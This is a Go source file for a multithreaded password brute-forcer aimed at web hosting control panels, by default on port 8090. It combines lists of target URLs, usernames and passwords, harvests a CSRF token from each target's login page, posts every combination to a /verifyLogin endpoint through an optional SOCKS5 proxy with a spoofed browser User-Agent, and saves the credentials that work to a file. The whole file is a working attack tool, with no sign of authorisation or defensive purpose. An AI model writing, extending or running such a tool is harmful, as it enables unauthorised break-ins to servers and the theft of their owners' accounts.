package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"net/http"
	"net/http/cookiejar"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

type Credential struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type LoginResponse struct {
	LoginStatus  int    `json:"loginStatus"`
	ErrorMessage string `json:"error_message"`
}

type Scanner struct {
	stopScan       chan struct{}
	successCombos  []Credential
	successLock    sync.Mutex
	totalRequests  int64
	successCount   int64
	failedCount    int64
	startTime      time.Time
	httpTransport  *http.Transport
	clientPool     sync.Pool
	globalTimeout  time.Duration
	proxyAddress   string
	outputFile     string
	scanInProgress bool
}

func NewScanner(timeout time.Duration, proxyAddr string, outputFile string) *Scanner {
	s := &Scanner{
		globalTimeout: timeout,
		stopScan:      make(chan struct{}),
		proxyAddress:  proxyAddr,
		outputFile:    outputFile,
	}

	s.httpTransport = &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   s.globalTimeout,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   s.globalTimeout,
		ExpectContinueTimeout: 1 * time.Second,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		ForceAttemptHTTP2:     true,
	}

	s.clientPool.New = func() interface{} {
		jar, _ := cookiejar.New(nil)
		return &http.Client{
			Transport: s.httpTransport,
			Jar:       jar,
		}
	}

	return s
}

func (s *Scanner) readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func (s *Scanner) generateCombinations(urlFile, loginFile, passwordFile string) ([]Credential, error) {
	urls, err := s.readLines(urlFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read URLs: %v", err)
	}

	logins, err := s.readLines(loginFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read usernames: %v", err)
	}

	passwords, err := s.readLines(passwordFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read passwords: %v", err)
	}

	var combinations []Credential
	for _, u := range urls {
		for _, user := range logins {
			for _, pass := range passwords {
				combinations = append(combinations, Credential{
					URL:      u,
					Username: user,
					Password: pass,
				})
			}
		}
	}
	return combinations, nil
}

func (s *Scanner) createHTTPClient() (*http.Client, error) {
	if s.proxyAddress == "" {
		client := s.clientPool.Get().(*http.Client)
		client.Timeout = s.globalTimeout
		return client, nil
	}

	dialer, err := proxy.SOCKS5("tcp", s.proxyAddress, nil, proxy.Direct)
	if err != nil {
		return nil, err
	}

	transport := &http.Transport{
		DialContext:         s.httpTransport.DialContext,
		Dial:                dialer.Dial,
		TLSClientConfig:     s.httpTransport.TLSClientConfig,
		MaxIdleConns:        s.httpTransport.MaxIdleConns,
		IdleConnTimeout:     s.httpTransport.IdleConnTimeout,
		TLSHandshakeTimeout: s.httpTransport.TLSHandshakeTimeout,
	}

	jar, _ := cookiejar.New(nil)
	return &http.Client{
		Transport: transport,
		Jar:       jar,
		Timeout:   s.globalTimeout,
	}, nil
}

func (s *Scanner) testConnection(credential Credential) {
	defer atomic.AddInt64(&s.totalRequests, 1)

	client, err := s.createHTTPClient()
	if err != nil {
		atomic.AddInt64(&s.failedCount, 1)
		return
	}
	defer func() {
		if s.proxyAddress == "" {
			s.clientPool.Put(client)
		}
	}()

	baseURL := credential.URL
	if len(baseURL) > 0 && baseURL[0] != 'h' {
		baseURL = "https://" + baseURL + ":8090"
	}

	ctx, cancel := context.WithTimeout(context.Background(), s.globalTimeout)
	defer cancel()

	// 1. Get CSRF token
	req, _ := http.NewRequestWithContext(ctx, "GET", baseURL+"/login", nil)
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		atomic.AddInt64(&s.failedCount, 1)
		fmt.Printf("[FAILED] %s | %s (Connection error)\n", credential.URL, credential.Username)
		return
	}
	resp.Body.Close()

	var csrfToken string
	for _, cookie := range resp.Cookies() {
		if cookie.Name == "csrftoken" {
			csrfToken = cookie.Value
			break
		}
	}

	if csrfToken == "" {
		atomic.AddInt64(&s.failedCount, 1)
		fmt.Printf("[FAILED] %s | %s (No CSRF token)\n", credential.URL, credential.Username)
		return
	}

	// 2. Attempt login
	body, _ := json.Marshal(map[string]string{
		"username": credential.Username,
		"password": credential.Password,
	})

	loginReq, _ := http.NewRequestWithContext(ctx, "POST", baseURL+"/verifyLogin", bytes.NewBuffer(body))
	loginReq.Header.Set("Content-Type", "application/json;charset=UTF-8")
	loginReq.Header.Set("X-CSRFToken", csrfToken)
	loginReq.Header.Set("Referer", baseURL+"/login")

	loginResp, err := client.Do(loginReq)
	if err != nil {
		atomic.AddInt64(&s.failedCount, 1)
		fmt.Printf("[FAILED] %s | %s (Login error)\n", credential.URL, credential.Username)
		return
	}
	defer loginResp.Body.Close()

	var result LoginResponse
	json.NewDecoder(loginResp.Body).Decode(&result)

	if result.LoginStatus == 1 {
		s.successLock.Lock()
		s.successCombos = append(s.successCombos, credential)
		s.successLock.Unlock()
		atomic.AddInt64(&s.successCount, 1)
		fmt.Printf("[SUCCESS] %s | %s | %s\n", credential.URL, credential.Username, credential.Password)
	} else {
		atomic.AddInt64(&s.failedCount, 1)
		fmt.Printf("[FAILED] %s | %s (Invalid credentials)\n", credential.URL, credential.Username)
	}
}

func (s *Scanner) Start(urlFile, loginFile, passwordFile string, threadCount int) {
	if urlFile == "" || loginFile == "" || passwordFile == "" {
		fmt.Println("Error: URL, Login and Password files are required")
		return
	}

	s.scanInProgress = true
	s.successCombos = nil
	s.totalRequests = 0
	s.successCount = 0
	s.failedCount = 0
	s.startTime = time.Now()

	fmt.Println("Starting scan...")
	fmt.Printf("Threads: %d, Timeout: %v\n", threadCount, s.globalTimeout)

	combinations, err := s.generateCombinations(urlFile, loginFile, passwordFile)
	if err != nil {
		fmt.Println("Error:", err)
		s.scanInProgress = false
		return
	}

	total := len(combinations)
	fmt.Printf("Total combinations to test: %d\n", total)

	workChan := make(chan Credential, threadCount*2)
	var wg sync.WaitGroup

	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for cred := range workChan {
				select {
				case <-s.stopScan:
					return
				default:
					s.testConnection(cred)
				}
			}
		}()
	}

	go func() {
		for _, combo := range combinations {
			select {
			case <-s.stopScan:
				break
			case workChan <- combo:
			}
		}
		close(workChan)
	}()

	wg.Wait()

	s.scanInProgress = false
	elapsed := time.Since(s.startTime)
	fmt.Printf("\nScan completed!\nSuccess: %d, Failed: %d, Time: %v\n",
		s.successCount, s.failedCount, elapsed.Round(time.Second))

	if s.outputFile != "" && len(s.successCombos) > 0 {
		file, err := os.Create(s.outputFile)
		if err != nil {
			fmt.Println("Error saving results:", err)
			return
		}
		defer file.Close()

		for _, cred := range s.successCombos {
			_, err := file.WriteString(fmt.Sprintf("%s|%s|%s\n", cred.URL, cred.Username, cred.Password))
			if err != nil {
				fmt.Println("Error writing results:", err)
				break
			}
		}
		fmt.Println("Results saved to:", s.outputFile)
	}
}

func (s *Scanner) Stop() {
	if s.scanInProgress {
		s.stopScan <- struct{}{}
		fmt.Println("\nScan stopped by user")
		s.scanInProgress = false
	}
}

func main() {
	// Configuration des flags
	urlFile := flag.String("url", "", "File containing target URLs (required)")
	loginFile := flag.String("user", "", "File containing usernames (required)")
	passwordFile := flag.String("pass", "", "File containing passwords (required)")
	threads := flag.Int("threads", 10, "Number of concurrent threads")
	timeout := flag.Int("timeout", 10, "Timeout in seconds")
	proxyAddr := flag.String("proxy", "", "Proxy address (e.g. 127.0.0.1:8080)")
	outputFile := flag.String("output", "", "Output file for valid credentials")

	flag.Parse()

	// Validation des paramètres obligatoires
	if *urlFile == "" || *loginFile == "" || *passwordFile == "" {
		fmt.Println("Error: Missing required arguments")
		flag.Usage()
		os.Exit(1)
	}

	// Création et démarrage du scanner
	scanner := NewScanner(time.Duration(*timeout)*time.Second, *proxyAddr, *outputFile)

	// Gestion du CTRL+C
	go func() {
		fmt.Println("\nPress CTRL+C to stop...")
		<-make(chan os.Signal, 1)
		scanner.Stop()
		os.Exit(0)
	}()

	scanner.Start(*urlFile, *loginFile, *passwordFile, *threads)
}
